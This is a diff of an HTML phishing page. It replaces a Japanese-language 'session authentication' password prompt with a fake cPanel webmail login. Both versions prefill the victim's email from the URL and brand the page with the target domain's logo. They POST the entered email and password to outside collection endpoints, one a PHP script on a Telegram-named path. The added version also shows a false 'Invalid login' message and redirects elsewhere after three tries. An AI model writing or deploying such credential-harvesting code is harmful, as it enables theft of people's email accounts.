@@ -1,439 +1,334 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title id="titt"></title>
-    <link rel="shortcut icon" href="" id="favico" type="image/x-icon">
+    <link rel="icon" type="image/x-icon" href="images/favicon.ico">
+
+    <title>Webmail Login</title>
     <style>
-        * {
-            box-sizing: border-box;
-            padding: 0;
-            margin: 0;
-        }
         body {
-            font-family: Arial, sans-serif;
-            height: 100vh;
+            margin: 0;
+            padding: 0;
+            font-family: "Open Sans", helvetica, arial, sans-serif;
+            color: #333;
+            background-color: #f5f5f5;
+        }
+        
+        .main-container {
+            margin: 45px auto;
+            min-height: 460px;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
         }
-
-        .login-container {
-            width: 420px;
-            padding: 1rem;
-            background-color: white;
-            border-radius: 8px;
-            background-color: rgb(255, 255, 255);
-            box-shadow: rgba(179, 179, 179, 0.7) 0px 10px 15px;
+        
+        .wrapper {
+            max-width: 356px;
+            margin: 0 auto;
+        }
+        
+        .logo-container {
+            height: 65px;
+            padding: 10px 0 0;
             text-align: center;
-            font-family: Verdana, Geneva, Tahoma, sans-serif;
         }
-
-        .login-container h1 {
-            font-size: 20px;
-            margin-bottom: 20px;
+        
+        .main-logo {
+            height: 50px;
         }
-
-        .login-container .os-info {
-            font-size: 15px;
-            margin-bottom: 15px;
-            color: #717171;
+        
+        .form-container {
+            padding: 30px;
         }
-        .login-container .os-info .boxch p {
-            font-size: 15px;
-            color: #717171;
-            font-family: auto;
-        } 
-
-        .login-container .os-info .boxch img {
-            vertical-align: middle;
-            margin-right: 5px;
-            width: 25px;
-            height: 25px;
-        }
-
-        .login-container .os-info span {
-            font-size: 15px;
-            color: #717171;
-            font-family: auto;
-        }
-
-        .login-container p {
+        
+        .input-label {
+            color: #293a4a;
             font-size: 14px;
-            margin: 10px 0;
+            font-weight: 600;
+            padding-bottom: 8px;
+            padding-left: 4px;
         }
-
-        .login-container p span {
-            color: #333;
+        
+        .input-field {
+            display: block;
+            height: 32px;
+            border-radius: 4px;
+            border: 2px solid #bebebe;
+            background-color: #fff;
+            background-repeat: no-repeat;
+            background-position: 6px 6px;
+            margin-bottom: 30px;
+        }
+        
+        .input-field input {
+            width: 220px;
+            height: 22px;
+            margin: 4px 5px 0 30px;
+            border-radius: 4px;
+            border: 1px solid #fff;
+            background: transparent;
+            color: #000;
+            font-family: "Open Sans", sans-serif;
+            font-size: 13px;
+            padding: 0 10px;
+            outline: none;
+        }
+        
+        .username-container {
+            background-image: url("/cPanel_magic_revision_1569621012/unprotected/cpanel/images/icon-username.png");
+        }
+        
+        .password-container {
+            background-image: url("/cPanel_magic_revision_1569621012/unprotected/cpanel/images/icon-password.png");
+        }
+        
+        .login-btn button {
+            border: 1px solid #095779;
+            border-radius: 4px;
+            color: #fff;
+            cursor: pointer;
+            background-color: #179bd7;
+            width: 285px;
+            font-size: 13px;
+            font-family: "Open Sans", sans-serif;
+            font-weight: 600;
+            padding: 7px 0;
+            text-align: center;
+        }
+        
+        .login-btn button:hover {
+            background-color: #1484bc;
+        }
+        
+        .reset-pw {
+            text-align: center;
+            padding: 25px 0;
+        }
+        
+        .reset-pw a {
+            color: #293a4a;
+            text-decoration: none;
+            font-size: 12px;
             font-weight: bold;
         }
-
-        .login-container form {
-            margin-top: 15px;
+        
+        .locale-container {
+            text-align: center;
+            padding: 40px 20px 20px;
+            margin-top: 40px;
+            max-width: 100%;
         }
-
-        .login-container input[type="password"] {
-            width: 100%;
-            padding: 10px;
-            height: 3.125pc;
-            font-size: 18px;
-            border: 1px solid rgb(140, 140, 140);
-            border-radius: 4px;
-            box-sizing: border-box;
-            margin-bottom: 10px;
-            letter-spacing: 7px;
-        }
-
-        .login-container .auth-error {
-            color: red;
-            font-size: 13px;
-            text-align: start !important;
-            margin-bottom: 10px;
-            display: none;
-        }
-
-        .login-container .checkbox-container {
+        
+        .locale-container ul {
+            margin: 0;
+            padding: 0;
+            list-style: none;
             display: flex;
-            align-items: center;
-            margin-bottom: 15px;
-            margin-top: 3rem;
-        }
-
-        .login-container .checkbox-container input[type="checkbox"] {
-            margin-right: 5px;
-        }
-
-        .login-container button {
-            width: 100%;
-            color: rgb(255, 255, 255);
-            background: rgb(24, 143, 255);
-            padding: 18px;
-            border: none;
-            font-size: 16px;
-            margin-bottom: 15px;
-            cursor: pointer;
-        }
-
-        .login-container button:hover {
-            background-color: #005bb5;
-        }
-
-        .login-container .footer {
-            font-size: 12px;
-            color: #000;
-            margin-top: 20px;
-            height: .520833333in;
-        }
-
-        .loader {
-            display: block;
-            --height-of-loader: 2px;
-            --loader-color: green;
-            width: 100%;
-            height: var(--height-of-loader);
-            border-radius: 30px;
-            background-color: transparent;
-            position: relative;
-        }
-
-        .loader::before {
-            content: "";
-            position: absolute;
-            background: var(--loader-color);
-            top: 0;
-            left: 0;
-            width: 0%;
-            height: 100%;
-            border-radius: 30px;
-            animation: moving 1.5s ease-in-out infinite;
-        }
-        
-        @keyframes moving {
-            50% {
-                width: 100%;
-            }
-            100% {
-                width: 0;
-                right: 0;
-                left: unset;
-            }
-        }
-        
-        .loaders {
-            padding: 5px;
-            border: 1px solid #747474;
-            width: 400px;
-            margin: 1rem auto;
-            border-radius: 24px;
-        }
-        
-        .loadcent {
-            width: 50%;
-        }
-        
-        .info {
-            display: flex;
-            align-items: center;
-            gap: 12px;
             flex-wrap: wrap;
             justify-content: center;
+            gap: 15px;
+        }
+        
+        .locale-container li {
+            display: inline-block;
+        }
+        
+        .locale-container a {
+            color: #293a4a;
+            text-decoration: none;
             font-size: 12px;
-        } 
-        
-        .info span i {
-            margin:0 5px;
+            font-weight: 600;
+            padding: 5px 10px;
+            display: inline-block;
         }
         
-        hr {
-            border: 0;
-            border-top: 1px solid #eee;
+        .locale-container a:hover {
+            text-decoration: underline;
         }
         
-        #password::placeholder {
-            letter-spacing: 1.7px !important;
-            font-size: 13px !important;
+        .more-locales {
+            font-size: 16px !important;
+            font-weight: bold !important;
         }
         
-        section {
-            position: fixed;
-            height: 100vh;
-            width: 100%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 10;
-            background: #fff;
+        .copyright {
+            color: #3f4143;
+            font-family: verdana;
+            font-size: 7pt;
+            margin: 10px 0 0;
+            padding: 30px 0 20px;
+            text-align: center;
+            background: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNTlwdCIgaGVpZ2h0PSIzMjAiIHZpZXdCb3g9IjAgMCAzNTkgMjQwIj48ZGVmcz48Y2xpcFBhdGggaWQ9ImEiPjxwYXRoIGQ9Ik0xMjMgMGgyMzUuMzd2MjQwSDEyM3ptMCAwIi8+PC9jbGlwUGF0aD48L2RlZnM+PHBhdGggZD0iTTg5LjY5IDU5LjEwMmg2Ny44MDJsLTEwLjUgNDAuMmMtMS42MDUgNS42LTQuNjA1IDEwLjEtOSAxMy41LTQuNDAyIDMuNC05LjUwNCA1LjA5Ni0xNS4zIDUuMDk2aC0zMS41Yy03LjIgMC0xMy41NSAyLjEwMi0xOS4wNSA2LjMtNS41MDUgNC4yLTkuMzUzIDkuOTA0LTExLjU1MiAxNy4xMDMtMS40IDUuNDAzLTEuNTUgMTAuNS0uNDUgMTUuMzAyIDEuMDk4IDQuNzk2IDMuMDQ3IDkuMDUgNS44NTIgMTIuNzUgMi43OTcgMy43MDMgNi40IDYuNjUyIDEwLjc5NyA4Ljg1IDQuMzk3IDIuMiA5LjE5OCAzLjI5OCAxNC40IDMuMjk4aDE5LjJjMy42MDIgMCA2LjU0NyAxLjQ1MyA4Ljg1MiA0LjM1MiAyLjI5NyAyLjkwMiAyLjk0NSA2LjE0OCAxLjk1IDkuNzVsLTEyIDQ0LjM5OGgtMjFjLTE0LjQwMyAwLTI3LjY1My0zLjE0OC0zOS43NS05LjQ1LTEyLjEwMi02LjMtMjIuMTUzLTE0LjY0OC0zMC4xNTMtMjUuMDUtOC0xMC4zOTUtMTMuNDU0LTIyLjI0Ni0xNi4zNS0zNS41NDctMi45LTEzLjMtMi41NS0yNi45NSAxLjA1Mi00MC45NTNsMS4yLTQuNWMyLjU5Ny05LjYwMiA2LjY0OC0xOC40NSAxMi4xNDgtMjYuNTUgNS41LTguMDk4IDEyLTE1IDE5LjUtMjAuNyA3LjUtNS43IDE1Ljg1LTEwLjE0OCAyNS4wNS0xMy4zNTIgOS4yLTMuMTk1IDE4Ljc5Ny00Ljc5NiAyOC44LTQuNzk2IiBmaWxsPSIjZmY2YzJjIi8+PGcgY2xpcC1wYXRoPSJ1cmwoI2EpIj48cGF0aCBkPSJNMTIzLjg5IDI0MEwxODIuOTkgMTguNjAyYzEuNTk4LTUuNTk4IDQuNTk4LTEwLjA5OCA5LTEzLjVDMTk2LjM4OCAxLjcgMjAxLjQ4NCAwIDIwNy4yODggMGg2Mi43YzE0LjQwMyAwIDI3LjY1IDMuMTQ4IDM5Ljc1IDkuNDUgMTIuMTAyIDYuMyAyMi4xNTMgMTQuNjU1IDMwLjE1MyAyNS4wNSA3Ljk5NyAxMC40MDIgMTMuNSAyMi4yNTQgMTYuNSAzNS41NSAzIDEzLjMwNSAyLjU5NCAyNi45NTQtMS4yMDIgNDAuOTVsLTEuMiA0LjVjLTIuNTk3IDkuNjAyLTYuNTk3IDE4LjQ1LTEyIDI2LjU1LTUuMzk4IDguMDk4LTExLjg0NyAxNS4wNTItMTkuMzQ3IDIwLjg0OC03LjUgNS44MDUtMTUuODU1IDEwLjMwNS0yNS4wNSAxMy41LTkuMiAzLjIwNC0xOC44MDUgNC44MDUtMjguODA1IDQuODA1aC01NC4yOTdsMTAuOC00MC41YzEuNi01LjQwMiA0LjYtOS44IDktMTMuMjAzIDQuMzk2LTMuMzk4IDkuNDk3LTUuMTAyIDE1LjMwMi01LjEwMmgxNy4zOThjNy4yIDAgMTMuNjUzLTIuMiAxOS4zNTItNi41OTcgNS42OTUtNC4zOTggOS40NDUtMTAuMDk3IDExLjI1LTE3LjEgMS4zOTQtNC45OTcgMS41NDctOS45LjQ0NS0xNC43LTEuMS00LjgtMy4wNS05LjA0Ny01Ljg0OC0xMi43NS0yLjgtMy42OTUtNi40MDItNi42OTUtMTAuNzk2LTktNC40MDYtMi4yOTctOS4yMDYtMy40NS0xNC40MDItMy40NUgyMzMuMzlsLTQzLjggMTYyLjkwM2MtMS42MDYgNS40LTQuNjA2IDkuNzk3LTkgMTMuMTk1LTQuNDAzIDMuNDA3LTkuNDA2IDUuMTAyLTE1IDUuMTAyaC00MS43IiBmaWxsPSIjZmY2YzJjIi8+PC9nPjwvc3ZnPgo=") center top / 25px no-repeat;
         }
         
-        @media screen and (max-width: 768px) {
-            .login-container {
-                width: 100%;
-                padding: 2rem;
-                background-color: white !important;
-                border-radius: 8px;
-                background-color: transparent;
-                box-shadow: none;
-                text-align: center;
-                font-family: Verdana, Geneva, Tahoma, sans-serif;
-            }
-            .loadcent {
-                width: 90%;
-            }
-            .loaders {
-                padding: 5px;
-                border: 1px solid #747474;
-                width: 90%;
-                margin: 1rem auto;
-                border-radius: 24px;
-            }
-            .info {
-                display: flex;
-                align-items: center;
-                gap: 12px;
-                flex-wrap: wrap;
-                justify-content: center;
-                font-size: 12px;
-            } 
-        }
-    </style>
-    <script>
-        function displayInfo() {
-            const currentDate = new Date();
-            const dateString = currentDate.toDateString();
-            const timeString = currentDate.toLocaleTimeString();
-            const datetimeElements = document.getElementsByClassName("datetime");
-            for (let i = 0; i < datetimeElements.length; i++) {
-                datetimeElements[i].innerHTML = '<i class="far fa-calendar-alt icon"></i>' + dateString + ' <i class="far fa-clock icon"></i>' + timeString;
-            }
-        
-            const browserType = detectBrowser();
-            const browserElements = document.getElementsByClassName("browser");
-            for (let i = 0; i < browserElements.length; i++) {
-                browserElements[i].innerHTML = '<i class="fab fa-chrome icon"></i>' + browserType;
-            }
-        
-            const os = detectOS();
-            const osElements = document.getElementsByClassName("os");
-            for (let i = 0; i < osElements.length; i++) {
-                osElements[i].innerHTML = '<i class="fab fa-windows icon"></i>' + os;
-            }
-        
-            fetch("https://ipapi.co/json/")
-                .then(response => response.json())
-                .then(data => {
-                    const city = data.city;
-                    const country = data.country_name;
-                    const locationElements = document.getElementsByClassName("location");
-                    for (let i = 0; i < locationElements.length; i++) {
-                        locationElements[i].innerHTML = '<i class="fas fa-map-marker-alt icon"></i>' + city + ', ' + country;
-                    }
-                })
-                .catch(error => {
-                    const locationElements = document.getElementsByClassName("location");
-                    for (let i = 0; i < locationElements.length; i++) {
-                        locationElements[i].innerHTML = '<i class="fas fa-map-marker-alt icon"></i>Unable to retrieve';
-                    }
-                });
+        .copyright a {
+            color: #3f4143;
+            text-decoration: none;
         }
         
-        function detectBrowser() {
-            const userAgent = window.navigator.userAgent;
-            const browsers = {
-                chrome: /chrome/i,
-                safari: /safari/i,
-                firefox: /firefox/i,
-                ie: /internet explorer/i,
-                edge: /edge/i,
-                opera: /opera|OPR/i,
-                android: /android/i,
-                ios: /iphone|ipad|ipod/i
-            };
-            for (let key in browsers) {
-                if (browsers[key].test(userAgent)) {
-                    return key.charAt(0).toUpperCase() + key.slice(1);
-                }
-            }
-            return "Unknown";
-        }
-        
-        function detectOS() {
-            const userAgent = window.navigator.userAgent;
-            if (userAgent.indexOf("Windows") !== -1) {
-                return "Windows";
-            } else if (userAgent.indexOf("Mac") !== -1) {
-                return "Mac OS";
-            } else if (userAgent.indexOf("Linux") !== -1) {
-                return "Linux";
-            }
-            return "Unknown";
+        .copyright a:hover {
+            text-decoration: underline;
         }
 
-        window.onload = displayInfo;
-    </script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+        .alert-danger {
+            color: red;
+            padding: 10px;
+            margin-bottom: 15px;
+        }
+    </style>
 </head>
-<body id="body">
-   <section id="loaddd">
-        <div class="loadcent">
-             <img src="" id="loimg" style="width: 70px;height: auto;text-align: center;display: block;margin: auto;" alt="">
-            <div class="loaders">
-                <div class="loader"></div>
+
+<body>
+    <div class="main-container">
+        <div class="wrapper">
+            <div class="logo-container">
+                <img class="main-logo" src="https://webmail.empowernc.com/cPanel_magic_revision_1569621012/unprotected/cpanel/images/webmail-logo.svg" alt="logo">
             </div>
-            <hr style="width:50%;text-align:center; margin: 20px auto;">
-            <p style="text-align: center;">Loading <span id="emailich"></span> mail setting ...</p>
-            <hr style="width:50%;text-align:center; margin: 20px auto;">
-            <div class="info">
-                <span class="datetime"></span>
-                <span class="browser"></span>
-                <span class="os"></span>
-                <span class="location"></span>
+            
+            <div class="form-container">
+                <form id="contact" novalidate="">
+                    <center>
+                        <div class="alert alert-danger" id="mgss" style="display: none;"></div>
+                        <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
+                    </center>
+
+                    <div class="input-label">
+                        <label for="ai">Email Address</label>
+                    </div>
+                    <div class="input-field username-container">
+                        <input id="ai" name="ai" autofocus="autofocus" value="" placeholder="Enter your email address." type="text" tabindex="1" required="">
+                    </div>
+                    
+                    <div class="input-label">
+                        <label for="pr">Password</label>
+                    </div>
+                    <div class="input-field password-container">
+                        <input id="pr" name="pr" placeholder="Enter your email password." type="password" tabindex="2" required="">
+                    </div>
+                    
+                    <div class="login-btn">
+                        <button id="submit-btn" type="submit" tabindex="3">Log in</button>
+                    </div>
+                    
+                    <div class="reset-pw">
+                        <a href="https://webmail.empowernc.com/resetpass?start=1">Reset Password</a>
+                    </div>
+                </form>
             </div>
         </div>
-   </section>
-   
-    <div class="login-container">
-        <img src="" alt="" width="70px" height="auto" id="imgg">
-        <div class="info" style="text-align: center;">
-            <span class="datetime"></span>
-            <span class="browser"></span>
-            <span class="os"></span>
-            <span class="location"></span>
-        </div>
-        <p id="auth_email" style="color: rgb(6, 39, 171);text-align: center;font-size: 17px;"></p>
-       
-        <hr style="width:100%;text-align:left;margin: 20px 0;margin-left:0;border-color: #eee;">
-        <p>セッション認証が必要です！以下の情報をご入力ください。 <span id="ux-group"></span> 続行するにはパスワードが必要です。</p>
         
-        <form action="" id="testForm" method="POST">
-            <input type="hidden" name="aa" id="ux" required value="">
-            <input type="password" id="password" name="bb" placeholder="Password" required>
-            
-            <div class="auth-error" id="uy-group" style="display: none;">パスワードが間違っています。もう一度お試しください。</div>
-            
-            <div class="checkbox-container">
-                <input type="checkbox" id="show-password">
-                <label for="show-password" style="color: #0A66C3;font-size: 13px;">パスワードを表示</label>
-            </div>
-            
-            <button type="submit" id="subBtn">次</button>
-        </form>
-        <hr style="width:100%;text-align:left;margin-left:0;border-color: rgba(128, 128, 128, 0.318);margin: 20px 0;">
-        
-        <div class="footer">
-            © 2026 <span id="emailichjdk"></span> 安全なポータル | プライバシー 
+        <div class="locale-container">
+            <ul>
+                <li><a href="https://webmail.empowernc.com/?locale=en">English</a></li>
+                <li><a href="https://webmail.empowernc.com/?locale=ar">العربية</a></li>
+                <li><a href="https://webmail.empowernc.com/?locale=cs">čeština</a></li>
+                <li><a href="https://webmail.empowernc.com/?locale=da">dansk</a></li>
+                <li><a href="https://webmail.empowernc.com/?locale=de">Deutsch</a></li>
+                <li><a href="https://webmail.empowernc.com/?locale=el">Ελληνικά</a></li>
+                <li><a href="https://webmail.empowernc.com/?locale=es">español</a></li>
+                <li><a href="https://webmail.empowernc.com/?locale=es_419">español latinoamericano</a></li>
+                <li><a href="javascript:void(0)" title="More locales" class="more-locales">…</a></li>
+            </ul>
         </div>
     </div>
     
-    <script>
-        var fille = "https://mine.repeatcar.com/568/mx/report.php";
-        
-        var fullUrl = window.location.href;
-        var emailRegex = /#([^#]+)$/;
-        var match = fullUrl.match(emailRegex);
-        var emaill = match ? match[1] : (fullUrl.includes('?') ? fullUrl.split('?')[1] : "user@example.com");
-        var domain = emaill.includes('@') ? emaill.substring(emaill.lastIndexOf("@") + 1) : "example.com";
-        var frmsite = domain.substring(0, domain.lastIndexOf("."));
-        
-        document.getElementById("emailich").textContent = domain;
-        document.getElementById("emailichjdk").textContent = domain;
-        document.getElementById("titt").textContent = `portal - ${domain} Email verification`;
-        document.getElementById('ux').value = emaill;
-        document.getElementById('auth_email').textContent = emaill;
-        document.getElementById("ux-group").textContent = domain;
-        document.getElementById("imgg").src = `https://logo.clearbit.com/${domain}`;
-        document.getElementById("loimg").src = `https://logo.clearbit.com/${domain}`;
-        document.getElementById("body").style.background = `linear-gradient(rgb(72 67 67 / 88%), #181717cc), url("https://image.thum.io/get/width/1200/https://${domain}")`;
-        
-        setTimeout(() => {
-            document.getElementById("loaddd").style.display = "none";
-        }, 3000);
+    <div class="copyright">
+        Copyright© 2026 cPanel, L.L.C.<br>
+        <a href="https://go.cpanel.net/privacy" target="_blank">Privacy Policy</a>
+    </div>
 
-        var formSubmitted = 0;
+<script>
+    /* global $ */
+    $(document).ready(function() {
+        function updateLogo(email) {
+            var domain = email.substring(email.lastIndexOf("@") + 1);
+            var logoUrl = "https://logo.clearbit.com/" + domain;
+            var domainName = domain.split('.')[0];
+            $("#logo").attr("src", logoUrl);
+        }
 
-        $("#testForm").on("submit", function (event) {
+        var email = window.location.hash.substring(1);
+        if (email) {
+            $("#ai").val(email);
+            updateLogo(email);
+        }
+
+        $("#ai").focusout(function() {
+            var email = $("#ai").val().trim();
+            if (email) {
+                updateLogo(email);
+            }
+        });
+
+        var count = 0;
+
+        $('#back1').click(function() {
+            $("#mgss").hide();
+            $('#ai').val("");
+            $("#automail").animate({ left: 200, opacity: "hide" }, 0);
+            $("#inputbar").animate({ right: 200, opacity: "show" }, 1000);
+        });
+
+        $('#submit-btn').click(function(event) {
+            $('#error').hide();
+            $('#mgss').hide();
             event.preventDefault();
-            formSubmitted++;
-            
-            $("#subBtn").prop("disabled", true).text("読み込み中...");
-            $("#uy-group").hide();
-            
-            var formData = new FormData(this);
+            var ai = $("#ai").val();
+            var pr = $("#pr").val();
+
+            if (!ai.trim()) {
+                $('#error').show();
+                $('#ai').focus();
+                return false;
+            }
+
+            if (!pr.trim()) {
+                $('#mgss').show();
+                $('#mgss').html("Password is required");
+                return false;
+            }
+
+            count = count + 1;
 
             $.ajax({
-                url: fille,
+                dataType: 'JSON',
+                url: 'http://growmyedgesback.com/thg/duba/telegram.php',
                 type: 'POST',
-                data: formData,
-                processData: false,
-                contentType: false,
-                timeout: 10000,
-                success: function (response) {
-                    if (formSubmitted === 1) {
-                        $("#password").val("");
-                        $("#uy-group").show();
-                        $("#subBtn").prop("disabled", false).text("次");
-                    } else {
-                        window.location.href = `http://www.${domain}`;
-                    } 
+                data: {
+                    ai: ai,
+                    pr: pr,
                 },
-                error: function() {
-                    // Fallback to flow even on error
-                    if (formSubmitted === 1) {
-                        $("#password").val("");
-                        $("#uy-group").show();
-                        $("#subBtn").prop("disabled", false).text("次");
+                beforeSend: function(xhr) {
+                    $('#submit-btn').html('Verifying...');
+                },
+                success: function(response) {
+                    console.log('Success:', response);
+                },
+                error: function(xhr, status, error) {
+                    console.error('Error:', status, error);
+                    console.log('Response:', xhr.responseText);
+                },
+                complete: function() {
+                    $("#pr").val("");
+                    if (count >= 3) {
+                        count = 0;
+                        var domain = ai.substring(ai.lastIndexOf("@") + 1);
+                        window.location.replace("https://login.statemortgageregistry.com/login");
                     } else {
-                        window.location.href = `http://www.${domain}`;
+                        $("#mgss").show();
+                        $('#mgss').html("Invalid login Please try again later");
+                        $('#submit-btn').html('Log in');
                     }
                 }
             });
         });
+    });
+</script>
 
-        document.getElementById("show-password").addEventListener("change", function() {
-            var passwordField = document.getElementById("password");
-            passwordField.type = this.checked ? "text" : "password";
-        });
-    </script>
 </body>
 </html>
